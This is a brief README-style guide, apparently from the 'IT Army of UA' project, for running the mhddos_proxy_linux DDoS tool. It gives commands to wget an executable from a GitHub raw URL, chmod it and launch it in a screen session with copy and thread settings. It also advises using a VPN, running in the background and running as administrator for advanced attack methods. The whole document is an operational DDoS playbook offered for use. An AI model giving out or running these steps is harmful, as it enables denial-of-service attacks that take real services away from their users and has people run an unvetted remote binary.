# IT ARMY OF UA
https://itarmy.com.ua | mhddos_proxy_linux 

1) Download mhdd tool | wget https://raw.githubusercontent.com/serbianka07/v105/main/mhdd
2) Make the file executable | chmod +x mhdd
3) Start the execution in the screen session | screen -S 'mhdd' ./mhdd --user-id=0000000000 --copies 2 -t 8000

To collect statistics, add the Telegram user-id. This repository also has a Bash script with all the parameters. 
You should clone the repo and replace the Telegram ID with your own. 
If you don't want to collect statistics about your personal contributions, just edit mhdd.sh remove this parameter --user-id=00000000000. 
You can also run the binary with no parameters at all, or you can put --copies auto. 

Good luck



Warning Be sure to use a VPN with the --use-my-ip option

Warning Don't mix VPN with proxy as it can lead to poor performance

Warning To make it run in the background, use the screen or tmux utilities

Warning To run some advanced methods, you need to run the tool as an administrator

